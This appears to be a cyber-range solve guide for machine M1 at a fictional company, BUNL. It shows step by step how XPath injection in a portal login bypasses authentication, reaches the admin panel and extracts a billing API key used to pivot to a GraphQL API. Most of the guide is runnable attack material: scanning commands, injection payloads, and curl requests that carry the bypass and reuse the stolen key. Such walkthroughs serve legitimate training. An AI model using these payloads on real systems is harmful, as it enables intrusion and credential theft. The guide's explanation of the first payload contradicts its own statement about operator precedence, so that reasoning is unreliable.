# Red Team Solve Guide — M1
## RNG-EXT-01 | M1-ext-customer-portal | XPath Injection → Auth Bypass
**Technique:** T1190 — Exploit Public-Facing Application  
**Pivot In:** Public internet  
**Pivot Out:** Billing API key `gql-key-b2f4a8c3e9d1f7b5` → M2 (GraphQL API, port 4000)

---

## Objective
Exploit an XPath injection vulnerability in the BUNL Customer Self-Service Portal login form to bypass authentication, land in the admin session, and extract the billing API key from the System Configuration panel.

---

## Step 1 — Enumerate the Target

```bash
nmap -sV -p- 203.x.x.x/24 -oN m1_scan.txt
# Key result: 8080/tcp open http — BUNL Customer Self-Service Portal
curl -s http://203.x.x.x:8080/ -L | grep -i "bunl\|login"
```

Navigate to `http://203.x.x.x:8080` — BUNL Customer Self-Service Portal v3.2.1 login page.

---

## Step 2 — Identify the Vulnerability

Observe the login form. Submit a normal username and a wrong password, intercept the request:
```
POST /login
username=test&password=test
```
The response shows `"Invalid credentials. Please try again."` — typical credential check.

Try a single quote in the username field:
```
username='&password=test
```
The response shows `"An error occurred during authentication."` — this indicates a backend parsing error consistent with XPath injection. The application is building an XPath expression using the input.

---

## Step 3 — Exploit XPath Injection — Authentication Bypass

The backend XPath expression is:
```xpath
//users/user[username/text()='INPUT' and password/text()='INPUT']
```

Inject into the username field to make the `and` clause evaluate to true regardless of password:
```
username=' or '1'='1
password=anything
```

Full POST payload:
```bash
curl -c /tmp/m1_cookies.txt -X POST http://203.x.x.x:8080/login \
  -d "username=%27+or+%271%27%3D%271&password=anything" -L -v
```

The XPath evaluates to:
```xpath
//users/user[username/text()='' or '1'='1' and password/text()='anything']
```
Due to XPath operator precedence (`and` binds tighter than `or`), this returns the first user in the document — which is `pmehta`, a customer. You'll land on the customer dashboard.

**To target the admin user specifically**, inject on the username to select by role:
```
username=' or role/text()='admin' or '1'='0
password=anything
```

```bash
curl -c /tmp/m1_cookies.txt -X POST http://203.x.x.x:8080/login \
  -d "username=%27+or+role%2Ftext%28%29%3D%27admin%27+or+%271%27%3D%270&password=x" -L \
  | grep -i "admin\|config\|api_key"
```

This returns the admin user `sysadmin` → session role is `admin` → redirected to `/admin`.

---

## Step 4 — Extract the Pivot Credential

Navigate to `/admin` panel. The **API Integration Settings** card shows:

```
Billing API Endpoint: http://billing-api.bunl-internal.net:4000/graphql
Billing API Key:      gql-key-b2f4a8c3e9d1f7b5
```

```bash
# Confirm admin session
curl -b /tmp/m1_cookies.txt http://203.x.x.x:8080/admin | grep "api_key\|gql-key"
```

---

## Step 5 — Verify Pivot to M2

```bash
# Use the billing API key against M2
curl -s -X POST http://203.x.x.x:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ listConsumers(apiKey: \"gql-key-b2f4a8c3e9d1f7b5\") { consumerId name } }"}'
# Returns consumer list — M2 API key confirmed valid
```

---

## Summary

| Item | Value |
|---|---|
| Vulnerability | XPath Injection in login form (CWE-643) |
| Authentication | Bypassed via `' or role/text()='admin' or '1'='0` |
| Credential Obtained | Billing API Key: `gql-key-b2f4a8c3e9d1f7b5` |
| Next Machine | M2 — GraphQL Billing API (port 4000) |
| MITRE | T1190 |
